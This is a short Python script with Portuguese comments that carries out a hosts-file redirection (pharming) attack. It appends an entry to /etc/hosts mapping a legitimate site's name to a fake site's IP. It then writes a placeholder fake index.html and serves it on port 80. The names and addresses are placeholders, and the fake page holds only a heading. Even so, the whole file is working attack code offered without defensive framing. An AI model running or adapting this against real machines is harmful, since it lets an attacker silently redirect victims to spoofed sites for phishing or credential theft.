import os

# Endereço IP e nome do site legítimo
ip_legitimo = "192.168.0.1"
site_legitimo = "www.site-legitimo.com"

# Endereço IP e nome do site falso
ip_falso = "192.168.0.2"
site_falso = "www.site-falso.com"

# Modifica o arquivo de hosts para redirecionar o site legítimo para o site falso
with open("/etc/hosts", "a") as f:
    f.write("{} {}\n".format(ip_falso, site_legitimo))

# Cria um servidor web local para servir o conteúdo do site falso
with open("/var/www/html/index.html", "w") as f:
    f.write("<html><body><h1>Site falso</h1></body></html>")
os.system("python3 -m http.server 80")
